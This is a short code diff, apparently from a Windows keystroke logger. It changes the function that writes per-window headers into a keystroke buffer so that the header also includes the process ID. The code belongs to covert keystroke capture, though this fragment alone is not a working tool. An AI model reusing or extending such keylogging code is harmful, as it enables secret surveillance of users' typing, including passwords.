@@ -378,8 +378,8 @@ int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
 			GetSystemTime(&st);
 			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
 			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
-			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s\n-[ @ %s %s UTC\n**\n", g_active_image, date_s, time_s);
-			RtlZeroMemory(g_prev_active_image, MAX_PATH);
+			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s | PID: %d\n-[ @ %s %s UTC\n**\n", g_active_image, info.cpid, date_s, time_s);
+      RtlZeroMemory(g_prev_active_image, MAX_PATH);
 			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
 		}
 		CloseHandle(active_proc);
